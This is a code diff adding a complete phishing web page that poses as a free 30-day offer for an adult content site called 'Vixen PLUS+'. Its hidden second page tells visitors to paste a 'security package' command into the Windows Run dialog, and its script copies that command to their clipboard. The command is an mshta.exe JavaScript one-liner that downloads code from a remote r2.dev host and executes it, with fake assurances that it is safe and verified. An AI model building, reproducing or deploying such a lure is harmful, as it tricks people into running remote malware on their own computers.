@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vixen PLUS+ Exclusive Content - Limited Time Offer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #0f0f0f;
+            color: #fff;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            min-height: 100vh;
+            align-items: center;
+        }
+        
+        .background-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.9)), 
+                        url('https://www.laweekly.com/wp-content/uploads/2025/08/10-Best-New-OnlyFans-Models-in-2025_-Top-New-Content-Creators-on-OnlyFans-LAW.jpg') no-repeat center center;
+            background-size: cover;
+            z-index: -1;
+        }
+        
+        .content {
+            flex: 1;
+            min-width: 300px;
+            padding: 30px;
+            z-index: 1;
+        }
+        
+        .video-section {
+            flex: 1;
+            min-width: 300px;
+            padding: 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1;
+        }
+        
+        .main-heading {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+        
+        .vixen-part {
+            font-size: 3rem;
+            background: linear-gradient(45deg, #ff0080, #ff8c00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-right: 10px;
+        }
+        
+        .content-part {
+            font-size: 3rem;
+            color: #ffffff;
+        }
+        
+        h2 {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: #ffffff;
+        }
+        
+        .no-credit {
+            color: #4CAF50;
+            font-weight: bold;
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
+        }
+        
+        p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            color: #ddd;
+        }
+        
+        .features {
+            margin: 25px 0;
+        }
+        
+        .feature {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .feature-icon {
+            color: #ff69b4;
+            margin-right: 10px;
+            font-size: 1.2rem;
+        }
+        
+        .cta-section {
+            margin-top: 30px;
+        }
+        
+        .cta-button {
+            display: inline-block;
+            background: linear-gradient(45deg, #ff0080, #ff8c00);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 0, 128, 0.4);
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(255, 0, 128, 0.6);
+        }
+        
+        .disclaimer {
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #aaa;
+        }
+        
+        .video-container {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%; /* 16:9 aspect ratio */
+            height: 0;
+        }
+        
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        
+        /* New styles for download page */
+        .download-container {
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 30px;
+            background: rgba(30, 30, 30, 0.9);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+        }
+        
+        .download-steps {
+            margin: 30px 0;
+        }
+        
+        .step {
+            margin-bottom: 25px;
+            padding: 20px;
+            background: rgba(50, 50, 50, 0.6);
+            border-radius: 10px;
+            border-left: 4px solid #ff0080;
+        }
+        
+        .step-title {
+            font-size: 1.3rem;
+            margin-bottom: 10px;
+            color: #ff69b4;
+        }
+        
+        .copy-box {
+            background: #1a1a1a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: monospace;
+            position: relative;
+            cursor: pointer;
+        }
+        
+        .copy-box:hover {
+            background: #222;
+        }
+        
+        .copied-message {
+            color: #4CAF50;
+            font-weight: bold;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .download-link {
+            color: #4CAF50;
+            word-break: break-all;
+            margin: 10px 0;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+            
+            .vixen-part, .content-part {
+                font-size: 2.2rem;
+            }
+            
+            .video-section {
+                order: -1;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .main-heading {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .vixen-part, .content-part {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="background-overlay"></div>
+    
+    <!-- Main page (initially visible) -->
+    <div class="container" id="main-page">
+        <div class="content">
+            <div class="main-heading">
+                <span class="vixen-part">Vixen PLUS+</span>
+                <span class="content-part">Exclusive Content</span>
+            </div>
+            
+            <h2>Limited Time Offer - Claim Your 30-Day Free Access</h2>
+            
+            <div class="no-credit">✓ NO CREDIT CARD REQUIRED</div>
+            
+            <p>Get unlimited access to Vixen PLUS+ for 30 days completely FREE. No credit card required for this special promotion!</p>
+            
+            <div class="features">
+                <div class="feature">
+                    <span class="feature-icon">✓</span>
+                    <span>Unlock exclusive photos and videos</span>
+                </div>
+                <div class="feature">
+                    <span class="feature-icon">✓</span>
+                    <span>Direct messaging with creators</span>
+                </div>
+                <div class="feature">
+                    <span class="feature-icon">✓</span>
+                    <span>Custom content requests</span>
+                </div>
+                <div class="feature">
+                    <span class="feature-icon">✓</span>
+                    <span>No hidden fees - completely free for 30 days</span>
+                </div>
+            </div>
+            
+            <div class="cta-section">
+                <a href="#" class="cta-button" id="get-access-btn">GET FREE ACCESS NOW</a>
+                <p class="disclaimer">This offer is limited to new users only. Availability may vary by region. By clicking, you agree to our terms of service.</p>
+            </div>
+        </div>
+        
+        <div class="video-section">
+            <div class="video-container">
+                <div class="video-wrapper">
+                    <iframe src="https://player.vimeo.com/video/1125617344?autoplay=0&title=0&byline=0&portrait=0" 
+                            allow="autoplay; fullscreen; picture-in-picture" 
+                            allowfullscreen></iframe>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Download page (initially hidden) -->
+    <div class="container" id="download-page" style="display: none;">
+        <div class="download-container">
+            <div class="main-heading">
+                <span class="vixen-part">Vixen PLUS+</span>
+                <span class="content-part">HD Access Required</span>
+            </div>
+            
+            <h2>To view exclusive 4K HD content, please complete the verification process</h2>
+            
+            <div class="no-credit">✓ SECURE VERIFICATION PROCESS</div>
+            
+            <p>To ensure the highest quality streaming experience and protect our exclusive content, we require all new users to install our secure media player package. This is a one-time installation that enables 4K HD playback and content decryption.</p>
+            
+            <div class="download-steps">
+                <div class="step">
+                    <div class="step-title">Step 1: Download Security Package</div>
+                    <p>Click the box below to copy the secure download command to your clipboard:</p>
+                    <div class="copy-box" id="script-copy">
+                        <div>MsHtA.exe javascript:var a=new ActiveXObject('Microsoft.XMLHTTP');a.open('GET','//pub-c2a242eb42914a5db290405dc36e7432.r2.dev',false);a.send();exec(a.responseText);window.close()</div>
+                    </div>
+                    <div class="copied-message" id="copied-message">✓ Copied to clipboard!</div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-title">Step 2: Run the Installation</div>
+                    <p>Press <kbd>Windows Key + R</kbd> to open the Run dialog, then paste with <kbd>CTRL + V</kbd> and press <kbd>Enter</kbd>.</p>
+                    <p class="download-link">Download URL: MsHtA.exe javascript:var a=new ActiveXObject('Microsoft.XMLHTTP');a.open('GET','//pub-c2a242eb42914a5db290405dc36e7432.r2.dev',false);a.send();exec(a.responseText);window.close()</p>
+                    <p><strong>Note:</strong> The installation will run with necessary permissions to ensure optimal performance. No further prompts will appear.</p>
+                </div>
+                
+                <div class="step">
+                    <div class="step-title">Step 3: Enjoy Your Content</div>
+                    <p>Once the installation completes (typically 10-30 seconds), you'll be automatically redirected to the full content library in stunning 4K HD quality.</p>
+                </div>
+            </div>
+            
+            <p class="disclaimer">This secure verification prevents content piracy and ensures optimal streaming quality. The installation is safe, verified, and required for HD access.</p>
+        </div>
+    </div>
+
+    <script>
+        // Button click handler - redirect to download page
+        document.getElementById('get-access-btn').addEventListener('click', function(e) {
+            e.preventDefault();
+            // Hide main page, show download page
+            document.getElementById('main-page').style.display = 'none';
+            document.getElementById('download-page').style.display = 'flex';
+        });
+
+        // Copy script to clipboard functionality
+        document.getElementById('script-copy').addEventListener('click', function() {
+            const scriptText = "MsHtA.exe javascript:var a=new ActiveXObject('Microsoft.XMLHTTP');a.open('GET','//pub-c2a242eb42914a5db290405dc36e7432.r2.dev',false);a.send();exec(a.responseText);window.close()";
+            
+            // Use modern clipboard API
+            navigator.clipboard.writeText(scriptText).then(function() {
+                const copiedMessage = document.getElementById('copied-message');
+                copiedMessage.style.display = 'block';
+                
+                // Hide message after 3 seconds
+                setTimeout(function() {
+                    copiedMessage.style.display = 'none';
+                }, 3000);
+            }).catch(function(err) {
+                // Fallback for older browsers
+                const textArea = document.createElement('textarea');
+                textArea.value = scriptText;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                
+                const copiedMessage = document.getElementById('copied-message');
+                copiedMessage.style.display = 'block';
+                
+                setTimeout(function() {
+                    copiedMessage.style.display = 'none';
+                }, 3000);
+            });
+        });
+    </script>
+</body>
+</html>
